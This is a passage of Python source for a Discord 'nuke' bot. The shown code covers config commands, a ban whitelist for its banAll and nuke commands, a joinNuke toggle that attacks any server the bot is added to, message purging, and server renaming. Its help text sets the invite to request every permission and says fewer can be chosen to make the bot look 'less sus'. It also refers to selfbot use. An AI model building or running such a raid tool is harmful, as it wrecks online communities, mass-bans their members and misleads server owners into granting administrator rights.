                            await log(ctx, f'Skipped deleting line `{item}` -> not an integer between 1 and {str(initial_length)}.')

                    await log(ctx, f'Successfully removed `{str(offset - 1)}` items.')
                else:
                    await log(ctx, f'Enter the line(s) that you want to remove from after commands.')

            elif args[0] == 'insert':
                if len(args) > 2 and args[1].isdigit():
                    if not (0 <= (index := int(args[1])) <= len(settings['after'])) or len(settings['after']) == 0:
                        await log(ctx, f'Line `{args[1]}` doesn\'t exist.')
                        return

                    settings['after'].insert(index, ' '.join(args[2:]))
                    await log(ctx, f'Added command after line `{args[1]}`.')
                else:
                    await log(ctx, 'Insert usage: `after insert <after line #> <command...>`')
            
            elif args[0] == 'list':
                await embed_list(args[1] if len(args) > 1 else '1', 'after command(s) list', settings['after'])

            else:
                await log(ctx, f'Unknown operation: `{args[0]}`')

    elif command == 'bot_status':
        if args is None:
            theColor = randint(0, 0xFFFFFF)
            embed = discord.Embed(
                title = 'bot_status',
                description = f'Whenever the bot boot up the status will be set to a given status.\n\ncolor: #{hex(theColor)[2:].zfill(6)}',
                color = theColor
            )
            embed.add_field(name='Status', value=f'{settings["bot_status"]}', inline=True)
            embed.add_field(name='Features', value='bot_status', inline=True)
            embed.add_field(name='Usage', value=f'`bot_status <on start status>` - set the on start status. Available on start status are `online`, `offline`, `idle`, and `dnd` or `do_not_disturb`. By default it is set to `offline`.', inline=False)

            embed.set_footer(text=f'Config is saved' if configIsSaved() else '(*)Config is not saved')
            await ctx.send(embed=embed)
        else:
            if (args := args.lower()) in ['online', 'offline', 'idle', 'dnd', 'do_not_disturb']:
                settings['bot_status'] = args
                await log(ctx, 'On bot start status has been set to `{args}`.')
            else:
                await log(ctx, 'Available on start status are `online`, `offline`, `idle`, and `dnd` or `do_not_disturb`.')

    elif command == 'bot_permission':
        if args is None:
            theColor = randint(0, 0xFFFFFF)
            embed = discord.Embed(
                title = 'bot_permission',
                description = f'If you are using a selfbot, then you don\'t have to do anything to this section. This bot_permission section is for normal bot invite URL that will ask the person inviting it for permission/roles (ex. admin, server manager). The default is set to 2146958847, which asks for all permissions. If you want to make the bot less sus, you can remove the permissions that are not needed.\n\ncolor: #{hex(theColor)[2:].zfill(6)}',
                color = theColor
            )
            embed.add_field(name='Value', value=f'{settings["bot_permission"]}', inline=True)
            embed.add_field(name='Features', value='bot_permission', inline=True)
            embed.add_field(name='Usage', value=f'`bot_permission <value>` - set permissions value to the given number. Use this [permission calculator](https://wizbot.cc/permissions-calculator/?v=0) to help you calculate the values. Note: if you are going to use that calculator all you need is to copy the number that is display at the top, and then use this command.', inline=False)

            embed.set_footer(text=f'Config is saved' if configIsSaved() else '(*)Config is not saved')
            await ctx.send(embed=embed)
        else:
            if args.isdigit() and 0 <= int(args) <= 2146958847:
                settings['bot_permission'] = args
                await log(ctx, 'Bot permission has been set to `{args}`.')
            else:
                await log(ctx, 'Please enter a value between 0 and 2146958847.')


    elif command == 'save':
        def check(message: discord.Message):
            return message.author.id == ctx.message.author.id

        if args is None:
            await log(ctx, f'You need to name the file. Use `{settings["command_prefix"]}save <file name>`.')
            return

        parent_dir = os.path.join(Path().absolute().__str__(), 'data')
        config_path = os.path.join(parent_dir, args.translate(bad_filename_map))

        if os.path.isfile(config_path):
            await log(ctx, f'Configuration file named {args} already exist. Do you want to overwrite it? [Y/n]')
            while True:
                try:
                    msg = (await client.wait_for('message', check=check, timeout=10)).content.lower()
                    if msg == 'y' or msg == 'yes':
                        with open(config_path, 'w') as f:
                            f.write(json.dumps(settings))
                            break
                    elif msg == 'n' or msg == 'no':
                        await log(ctx, f'Saving cancelled.')
                        return
                    
                    await log(ctx, f'Yes or no.')
                except (asyncio.exceptions.TimeoutError, discord.ext.commands.errors.CommandInvokeError):
                    await log(ctx, "Took too long to answer.")
                    return
        else:
            if not os.path.isdir(parent_dir):
                os.mkdir(parent_dir)
            with open(config_path, 'w+') as f:
                f.write(json.dumps(settings))

        global settings_copy
        settings_copy = deepcopy(settings)
        await log(ctx, 'Finished saving.')

    elif command == 'verbose':
        if args is None:
            status_list = []
            features_list = []

            # hard coding this because I don't think there's a better way to set the values.
            
            features_list.append('Log response from requests')
            if want_log_request:
                status_list.append(':white_check_mark:')
            else:
                status_list.append(':x:')

            features_list.append('Log messages in console')
            if want_log_console:
                status_list.append(':white_check_mark:')
            else:
                status_list.append(':x:')

            features_list.append('Log messages in discord chat')
            if want_log_message:
                status_list.append(':white_check_mark:')
            else:
                status_list.append(':x:')

            features_list.append('Log any errors')
            if want_log_errors:
                status_list.append(':white_check_mark:')
            else:
                status_list.append(':x:')

            theColor = randint(0, 0xFFFFFF)
            embed = discord.Embed(
                title = 'verbose',
                description = f'Verbose is the log level. Meaning that if you don\'t want any one of the logs to spam rate limiting errors or whatever errors that the bot is going to throw at you, you can disable them to prevent some lag.\n\nCurrent verbose value: `{str(settings["verbose"])}`\n:white_check_mark: = Enabled\n:x: = Disabled\ncolor: #{hex(theColor)[2:].zfill(6)}',
                color = theColor
            )

            embed.add_field(name='Status', value='\n'.join(status_list), inline=True)
            embed.add_field(name='Logs', value='\n'.join(features_list), inline=True)
            embed.add_field(name='Usage', value=f'`verbose <value>` - enable and disable the logs. Subtracting the values below from the current verbose to disable the log(s) you want, and adding the values will enable them. For example if I want to disable "Log any error" I will subtract 8 from 15 to get 7 and use 7 as the new verbose value to set, if I want to disable more like "Log response from request" I will substract 1 from 7 to get 6. To enable them back just add 8 and 1 to the current verbose value.\n\n`1` - Log response from requests\n`2` - Log messages in console\n`4`- Log messages in discord chat\n`8` - Log any errors.', inline=False)

            embed.set_footer(text=f'Config is saved' if configIsSaved() else '(*)Config is not saved')
            await ctx.send(embed=embed)
        else:
            if args.isdigit() and 0 <= (args := int(args)) <= 15:
                settings['verbose'] = args
                updateVerbose()
                await log(ctx, 'On bot start status has been set to `{args}`.')
            else:
                await log(ctx, 'You can only enter a positve integer between or on 0 and 15.')

    elif command == 'ban_whitelist':
        if args is None:
            status_list = []
            features_list = []
            
            features_list.append('ban_whitelist')
            if len(settings['ban_whitelist']) == 0:
                status_list.append(':x:')
            else:
                status_list.append(':white_check_mark:')

            theColor = randint(0, 0xFFFFFF)
            embed = discord.Embed(
                title = 'Ban whitelist',
                description = f'Ban whitelist is used for telling `{settings["command_prefix"]}banAll` and `{settings["command_prefix"]}nuke` to not ban the users in the list. You can put discord tag or discord ID in the list, but it is recommended to use discord ID because in the pass there has some uncheckable discord tags.\n\n:white_check_mark: = Ready to use\n:x: = Needs to config\ncolor: #{hex(theColor)[2:].zfill(6)}',
                color = theColor
            )
            embed.add_field(name='Status', value='\n'.join(status_list), inline=True)
            embed.add_field(name='Features', value='\n'.join(features_list), inline=True)
            embed.add_field(name='Usage', value=f'`ban_whitelist add <command>` - add user to the back of the command list\n\n`ban_whitelist remove <line number> [line number] [line...` - remove line(s) in the ban whitelist\n\n`ban_whitelist list [page number]` - list users that are in the ban whitelist', inline=False)

            embed.set_footer(text=f'Config is saved' if configIsSaved() else '(*)Config is not saved')
            await ctx.send(embed=embed)

        else:
            args = args.split()
            if args[0] == 'add':
                if len(args) > 1:
                    text = ' '.join(args[1:])
                    settings['ban_whitelist'].append(text)
                    await log(ctx, f'User added. Character length: `{str(len(text))}`.')
                else: 
                    await log(ctx, f'Please enter the userID or userTag that you want to add after line `{str(len(settings["after"]))}`.')
            
            elif args[0] == 'remove':
                if len(args) > 1:
                    del args[0]
                    offset = 1
                    initial_length = len(settings['ban_whitelist'])
                    for item in args:
                        if item.isdigit() and (0 <= (item := int(item)) - offset <= initial_length - offset):
                            del settings['ban_whitelist'][item - offset]
                            offset += 1
                        else:
                            await log(ctx, f'Skipped deleting line `{item}` -> not an integer between 1 and {str(initial_length)}.')

                    await log(ctx, f'Successfully removed `{str(offset - 1)}` items.')
                else:
                    await log(ctx, f'Enter line(s) to remove from usernames.')
            
            elif args[0] == 'list':
                await embed_list(args[1] if len(args) > 1 else '1', 'ban whitelist', settings['ban_whitelist'])

            else:
                await log(ctx, f'Unknown operation: `{args[0]}`')


    elif command == 'proxies':
        await log(ctx, 'This feature has been disabled for now due to unhandled slow/bad proxies.')

    elif command == 'prefix' or command == 'command_prefix':
        if args is None:
            await log(ctx, f'Use `` {command_prefix}config command_prefix <command_prefix> ``')
        else:
            settings['command_prefix'] = client.command_prefix = args

            await log(ctx, 'Command prefix changed.')
    elif command == 'token':
        if args is None:
            await log(ctx, 'Usage: `token <new token>` - new token for this config. Restarting the bot will be required. Remember to save the config before restarting.')
        else:
            settings['token'] = args
            await log(ctx, 'New token has been set.')
    else:
        await log(ctx, f'Unable to find the config. `{command}`')



## Additional functions ##
@commands.check(checkPerm)
@client.command(name='checkRolePermissions', aliases=['check', 'crp'])
async def checkRolePermissions(ctx, name, n='1'):
    if not await hasTarget(ctx):
        return
    if not n.isdigit() or (n := int(n) - 1) < 0:
        await log(ctx, 'Bad page number.')
        return
    member_ = containing(selected_server.members, nameIdHandler(name))
    if member_ is None:
        await log(ctx, f'Unable to found {name}.')
        return
    value = member_.guild_permissions.value

    temp = sorted(member_.guild_permissions, key=lambda p: p)
    master_list = ''

    item_length = 31
    init_item = n * per_page
    final_item = init_item + per_page
    if init_item > item_length - per_page:
        if init_item > item_length:
            await ctx.send('Invalid page number.')
            return
        final_item = init_item + (item_length % per_page)
    else:
        final_item = init_item + per_page
    for i in range(init_item, final_item, 1):
        item, has_perm = temp[i]
        if has_perm:
            master_list += ':white_check_mark: '
        else:
            master_list += ':x: '
        master_list += item.replace('_', ' ').capitalize() + '\n'
    
    # if not isDM(ctx) and ctx.guild.id == selected_server.id and 1 << 11 & selected_server.me.guild_permissions.value == 0:
    #     consoleLog('\n%s*Check role permissions*\n%sPermission value -> %s%d : 2147483647\n%s %s%d/%d' % (Fore.CYAN, Fore.RESET, Fore.YELLOW, value, master_list.replace(':white_check_mark:', f'{Fore.GREEN}+').replace(':x:', f'{Fore.RED}-'), Fore.YELLOW, n+1, ceil(item_length / per_page)), True)
    # else:
    try:
        embed = discord.Embed(
            title = 'User permissions',
            description = f'Encoded value: {str(value)} : 2147483647',
            color = discord.Color.red()
        )

        embed.add_field(name='Permissions', value=master_list, inline=True)
        embed.set_footer(text=f'{str(n+1)}/{str(ceil(item_length / per_page))}')
        await ctx.send(embed=embed)
    except:
        await ctx.send('```diff\n%s %d/%d```' % (master_list.replace(':white_check_mark:', '+').replace(':x:', '-'), n+1, ceil(item_length / per_page)))

@commands.check(checkPerm)
@client.command(name='serverIcon', aliases=['si', 'changeServerIcon'])
async def serverIcon(ctx, path=None):
    if not await hasTarget(ctx):
        return

    if path is None:
        await selected_server.edit(icon=None)
        await log(ctx, f'Successfully removed the server icon from `{selected_server.name}`.')
    elif path.startswith(('https://', 'http://', 'ftp://', 'ftps://')): # Link EX: https://www.example.com/aaa.png
        try:
            await selected_server.edit(icon=BytesIO(requests.get(path).content).read())
            consoleLog('Successfully changed the current server icon.')
        except:
            consoleLog(f'Unable to change the server icon to "{path}".')

    elif path[0] == '<': # EX: <a:triggeredd:627060014431076352>
        path = path.split(':')
        try:
            if path[0] == '<a': # Animated
                await selected_server.edit(icon=discord.File(BytesIO(requests.get(f'https://cdn.discordapp.com/emojis/{path[2][:-1]}.gif?v=1').content).read()))
            else:
                await selected_server.edit(icon=BytesIO(requests.get(f'https://cdn.discordapp.com/emojis/{path[2][:-1]}.png?v=1').content).read())
            await log(ctx, 'Successfully changed the server icon.')
        except:
            raise
    elif os.path.isfile(path): # File EX: C:\Users\user\Desktop\something.jpg or EX: .\icon\something.jpg
        with open(path, 'rb') as data:
            await selected_server.edit(icon=data.read())
            await log(ctx, 'Successfully changed the server icon.')
    else:
        try: 
            unicode_number = str(ord(path)) + ', '
        except:
            unicode_number = ''
        unicode_string = path.encode('utf8')
        sys.stdout.buffer.write(f'"{path}" is not supported to be set as a server icon.'.encode('utf8'))
        consoleLog(unicode_number)
        await log(ctx, f'{path} is not supported to be set as a server icon.')
        await log(ctx, f'Character\'s bytes: {unicode_number}{unicode_string}')

@commands.check(checkPerm)
@client.command(name='serverName', aliases=['sn', 'changeServerName'])
async def serverName(ctx, *, name):
    if not await hasTarget(ctx):
        return

    try:
        await selected_server.edit(name=name)
        await log(ctx, f'Server name has been changed to `{name}`.')
    except discord.errors.Forbidden:
        await log(ctx, 'Unable to change the server name.')
        raise
    except:
        raise

@commands.check(checkPerm)
@client.command(name='purge', aliases=['clear'])
async def purge(ctx, n=None):
    if not await hasTarget(ctx):
        return

    consoleLog('Purging messages...', True)

    if n is not None and (not n.isdigit() or (n := int(n)) < 1):
        await log(ctx, 'Please enter a positive integer.')
        return

    to_delete_messages = await ctx.channel.history(limit=n).flatten()
    consoleLog('Due to discord ratelimitings purging messages cannot be run in a fast pace. After every message the bot will timeout for 3 seconds', True)
    delay_time = 0
    for message in to_delete_messages:
        while True:
            await asyncio.sleep(delay_time)
            r = requests.delete(f'https://discord.com/api/v8/channels/{ctx.channel.id}/messages/{message.id}', headers=headers)
            if r.status_code == 429:
                delay_time = r.json()['retry_after']
                consoleLog(f'ratelimiting reached. Purging delay has been set to -> {str(delay_time)} seconds')
            else:
                break

@commands.check(checkPerm)
@client.command(name='leave')
async def leave(ctx, name=None):
    if name is None:
        if not await hasTarget(ctx):
            return
        await selected_server.leave()
    else:
        server = containing(client.guilds, name)
        if server is None:
            await log(ctx, f'Unable to find server {name}.')
            return
        await server.leave()

    if not isDM(ctx) and ctx.guild.id == selected_server.id:
        consoleLog(f'{Fore.BLUE}Goodbye {selected_server.name}! {Fore.YELLOW}-> {Fore.GREEN}Left {Fore.RESET}{selected_server.name}.', True)
    else:
        await log(ctx, f'Goodbye {selected_server.name}! -> Left {selected_server.name}.')

@commands.check(checkPerm)
@client.command(name='leaveAll')
async def leaveAll(ctx):
    await log(ctx, 'Leaving all servers. Note: You won\'t be able to message me after I left all servers.')
    for server in client.guilds:
        await server.leave() 
    consoleLog('Left all servers.', True)

@commands.check(checkPerm)
@client.command(name='joinNuke', aliases=['nukeOnJoin', 'join nuke'])
async def joinNuke(ctx, true_or_false):
    global saved_ctx, nuke_on_join
    if true_or_false.lower() == 'true':
        saved_ctx = ctx
        nuke_on_join = True
        await log(ctx, 'Nuke on bot joining a new server has been turned on.')
    elif true_or_false.lower() == 'false':
        nuke_on_join = False
        await log(ctx, 'Nuke on bot joining a new server has been turned off.')
    else:
        await log(ctx, 'Invalid flag: true or false. Note: true or false is not case sensitive.')

@commands.check(checkPerm)
@client.command(name='changeStatus', aliases=['cs'])
async def changeStatus(ctx, status):
    if status == 'offline':
        await client.change_presence(status=discord.Status.offline)
    elif status == 'invisible':
        await client.change_presence(status=discord.Status.invisible)
    elif status == 'online':
        await client.change_presence(status=discord.Status.online)
    elif status == 'idle':
        await client.change_presence(status=discord.Status.idle)
    elif status == 'dnd' or status == 'do_not_disturb':
        await client.change_presence(status=discord.Status.do_not_disturb)

@commands.check(checkPerm)
@client.command(name='link', aliases=['l'])
async def link(ctx):
    if not is_selfbot:
        await ctx.channel.send(f'https://discord.com/api/oauth2/authorize?client_id={client.user.id}&permissions={settings["bot_permission"]}&scope=bot')
    else:
        await log(ctx, f'This account is not a bot :). You can join servers with invite codes.')

@commands.check(checkPerm)
@client.command(name='autoNick', aliases=['an'])
async def autoNick(ctx):
    if not await hasTarget(ctx):
        return

    global auto_nick
    if not auto_nick:
        consoleLog(f'{Fore.CYAN}Auto nickname is on.', True)
        auto_nick = True
        while auto_nick:
            # payload = {'nick': ''.join(choice(alphanum) for _ in range(10))}
            # q.put((requests.patch, f'https://discord.com/api/v8/guilds/{selected_server.id}/members/%40me/nick', headers, payload))
            
            await selected_server.me.edit(nick=''.join(choices(alphanum, k=10)))
    else:
        consoleLog(f'{Fore.BLUE}Auto nickname is off.', True)
        auto_nick = False

@commands.check(checkPerm)
@client.command(name='autoStatus', aliases=['as'])
async def autoStatus(ctx):

    global auto_status
    if not auto_status:
        consoleLog(f'{Fore.CYAN}Auto status is on.', True)
        auto_status = True
        while auto_status:
            await client.change_presence(status=discord.Status.online)
            await asyncio.sleep(random() + 0.3) # Theres a rate limit for changing status every minute or 5 minutes i havent figure out the exact number but ill stay with this sleep commmand
            await client.change_presence(status=discord.Status.offline)
            await asyncio.sleep(random() + 0.3)
    else:
        consoleLog(f'{Fore.BLUE}Auto status is off.', True)
        auto_status = False

@commands.check(checkPerm)
@client.command(name='off', aliases=['logout', 'logoff', 'shutdown', 'stop'])
async def off(ctx):
    ### Discord takes too long to realize if the bot is offline people might get confused about the not turning off the bot vs discord takes time to update
    await changeStatus(None, 'offline')
    await client.logout()

###### Closing handler ######

###### https://github.com/aio-libs/aiohttp/issues/4324
from functools import wraps
from asyncio.proactor_events import _ProactorBasePipeTransport
def silence_event_loop_closed(func):
    @wraps(func)
    def wrapper(self, *args, **kwargs):
        try:
            return func(self, *args, **kwargs)
        except RuntimeError as e:
            if str(e) != 'Event loop is closed':
                raise
    return wrapper
_ProactorBasePipeTransport.__del__ = silence_event_loop_closed(_ProactorBasePipeTransport.__del__)

try:
    if is_selfbot:
        print('Selfbot is no longer supported')
        exit()
    client.run(settings['token'])
except discord.PrivilegedIntentsRequired:
    print('PrivilegedIntentsRequired: This field is required to request for a list of members in the discord server that the bot is connected to. Watch https://youtu.be/DXnEFoHwL1A?t=44 to see how to turn on the required field.')
    exit()
except Exception as e:
    print(e)
finally:
    sys.stdout.write('Exiting...               \n')
